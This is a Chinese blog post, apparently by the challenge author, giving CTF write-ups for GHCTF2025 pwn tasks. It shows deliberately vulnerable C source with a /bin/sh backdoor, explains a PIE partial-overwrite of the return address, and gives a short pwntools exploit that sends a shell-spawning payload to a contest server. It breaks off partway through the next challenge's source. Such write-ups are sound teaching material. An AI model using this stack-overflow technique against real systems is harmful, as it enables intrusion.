<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>GHCTF2025-PWN方向wp | iyheart的博客</title><meta name="author" content="iyheart"><meta name="copyright" content="iyheart"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：官方wp来了">
<meta property="og:type" content="article">
<meta property="og:title" content="GHCTF2025-PWN方向wp">
<meta property="og:url" content="http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/index.html">
<meta property="og:site_name" content="iyheart的博客">
<meta property="og:description" content="前言：官方wp来了">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover157.png">
<meta property="article:published_time" content="2025-03-09T10:54:59.000Z">
<meta property="article:modified_time" content="2025-03-11T12:34:19.930Z">
<meta property="article:author" content="iyheart">
<meta property="article:tag" content="博客, 笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover157.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'GHCTF2025-PWN方向wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-11 20:34:19'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/styles.css"><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iyheart的博客" type="application/atom+xml">
<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.5tu.cn/uploads/allimg/1910/pic_5tu_big_2019010211653346247.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">40</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/iyheart/tuchuang/main/img/cover157.png')"><nav id="nav"><span id="blog-info"><a href="/" title="iyheart的博客"><img class="site-icon" src="http://img95.699pic.com/photo/40151/9175.gif_wh860.gif"/><span class="site-name">iyheart的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 历史</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="javascript:toRandomPost()"><i class="fa-fw fas fa-bus"></i><span> 随机文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GHCTF2025-PWN方向wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-09T10:54:59.000Z" title="发表于 2025-03-09 18:54:59">2025-03-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-11T12:34:19.930Z" title="更新于 2025-03-11 20:34:19">2025-03-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/write-up/">write-up</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="GHCTF2025-PWN方向wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><ul>
<li>这次是我第一次出题，没什么经验，大部分题目都是对着一些比较经典的题目改的，QAQ。（还偷偷赛了题国际赛题）</li>
<li>这次出题感受还是挺深的，还是要多尝试一点东西。接下来就直接开始<code>wp</code>环节</li>
</ul>
<h1 id="hello_world"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h1><ul>
<li>考点：<code>ret2text</code>、<code>PIE保护</code>、<code>Linux内存分页机制</code>、<code>off-by-one</code></li>
<li>这题并不用爆破最后一个字节，题目已经设定好了。接下来我们来具体分析一下这个附件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">32</span>];</span><br><span class="line">        read(<span class="number">0</span>,s,<span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">out</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****  ******   ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*       *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;* ****  *****  *        *      ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*   *   *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****    *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello pwner!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the world of pwn!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Show time!!!!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        out();</span><br><span class="line">        func1();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc编译需要开启PIE保护，要关闭canary保护</span></span><br></pre></td></tr></table></figure>
<h2 id="helloworld分析1"><a href="#HelloWorld分析1" class="headerlink" title="HelloWorld分析1"></a>Hello<em>World</em>分析1</h2><ul>
<li>拿到附件后肯定是先要<code>check</code>一下这个附件开启了什么保护机制。<code>check</code>完后我们发现这个程序没有开启<code>canary</code>保护，但是开启了<code>PIE</code>保护</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190655495.png" alt="image-20250309190655495"></p>
<ul>
<li>接下来我们使用<code>IDA pro</code>反汇编一下这个代码，我们发现<code>main</code>函数这边只执行了<code>3</code>个函数，第一个<code>init</code>就不分析了，对输入输出进行初始化</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190804003.png" alt="image-20250309190804003"></p>
<ul>
<li>然后我们再来分析一下<code>out()</code>这个函数，发现并没有什么特别的，仅仅是几个输出函数</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190908838.png" alt="image-20250309190908838"></p>
<ul>
<li>现在来查看<code>func1</code>这个函数，发现这边会存在一个栈溢出的漏洞</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190954154.png" alt="image-20250309190954154"></p>
<ul>
<li>我们还注意到，这边还有一个函数名为<code>backdoor</code>的函数</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191039841.png" alt="image-20250309191039841"></p>
<ul>
<li>查看该函数会发现确实是一个后门函数</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191144341.png" alt="image-20250309191144341"></p>
<ul>
<li>由于程序开启了<code>PIE</code>保护，我们无法完全确定程序的地址，所以我们<code>IDA pro</code>反编译完，<code>backdoor</code>的这个函数地址是这样的</li>
<li>如果我们将<code>PIE</code>关闭后，在<code>64</code>位下程序会地址会为<code>0x400000</code>，在<code>32</code>为下程序地址为<code>0x08048000</code>（可以随便找两个对应靶场题目附件反编译看看）</li>
<li>但是由于内存分页机制，程序地址最后<code>3</code>个<code>16</code>进制位是不会改变的<code>Linux</code>下一个内存页为<code>0x1000</code>即（4KB）</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191314152.png" alt="image-20250309191314152"></p>
<ul>
<li>而我们调用<code>func1</code>这个函数时，保存的返回地址其实是<code>main</code>函数汇编中对应的这个汇编指令</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191836758.png" alt="image-20250309191836758"></p>
<ul>
<li>这时我们发现第<code>3</code>个二进制位他们是相同的。</li>
</ul>
<h2 id="helloworld分析2"><a href="#HelloWorld分析2" class="headerlink" title="HelloWorld分析2"></a>Hello<em>World</em>分析2</h2><ul>
<li>这时我们来进行动态调试，我们查看一下返回地址，我们发现调用<code>func1</code>时，保存在栈上的返回地址为<code>0x555eb72009f6</code></li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192103483.png" alt="image-20250309192103483"></p>
<ul>
<li>我们再来查看<code>backdoor</code>这个函数的起始地址，这个函数的起始地址为<code>0x555eb72009c1</code>（我们多次动态调试会发现其实<code>返回地址</code>和<code>backdoor</code>函数的起始地址其实就只有最后一个字节是<code>不同的</code>）</li>
</ul>
<p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192219972.png" alt="image-20250309192219972"></p>
<ul>
<li>这里要<strong>注意一下</strong>：如果<code>backdoor</code>和返回地址的第三个<code>16进制位</code>不同这时就要需要爆破，因为我们使用<code>read</code>的时候是一个字节一个字节写入到栈上，而一个字节是<code>2</code>个16进制位。我们再修改第<code>3</code>个16进制位的时候会修改到第<code>4</code>个16进制位。这时由于我们不知道第<code>4</code>个16进制位具体是多少，返回的时候就不知道返回到哪个地方了，所以如果遇到这种情况的话就需要进行爆破了。</li>
</ul>
<h2 id="hello_world_exp"><a href="#Hello-World-exp" class="headerlink" title="Hello_World_exp"></a>Hello_World_exp</h2><ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28285</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../attachment&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p8(<span class="number">0xC5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><ul>
<li>考点：<code>ret2libc</code>、<code>栈溢出</code>、<code>代码审计</code>。</li>
<li><p>这题其实就是<code>ret2libc</code>，这题并不是那种简单的一眼栈溢出的，可能还要稍微逆一下。遇到这种题不要害怕，认真逆。（走出做太多简单直白的<code>ret2libc</code>题目这个舒适区，同时也为堆的代码逆向做铺垫。）</p>
</li>
<li><p>这题源码如下：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> money = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> what_can_I_say = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to shop, what do you buy?\n&quot;</span>);       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.flowers\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.books\n&quot;</span>);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.hell money\n&quot;</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.clothing\n&quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5.buy my shop\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6.check youer money\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of flower would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.peony $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.rose $100\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.fragrans $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many flowers do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span 